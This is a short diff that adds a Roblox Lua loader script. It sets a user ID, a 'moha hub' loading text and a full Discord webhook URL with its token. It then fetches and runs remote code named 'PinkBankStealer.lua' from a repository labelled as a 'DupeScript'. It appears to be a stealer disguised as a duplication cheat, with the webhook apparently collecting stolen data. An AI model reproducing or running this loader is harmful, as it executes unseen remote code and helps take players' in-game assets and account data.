@@ -1,0 +1,5 @@
+_G.UserId = 1560978139
+_G.LoadingText = "moha hub"
+_G.Webhook = "https://discord.com/api/webhooks/1077185280362156122/1SHYfEZDKZwwLhcU7Q86kjn3lCw1rBAf4WK2E_EuWm9H5Gkqt49P3RASmShf58yHIsPu"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkBankStealer.lua", true))()
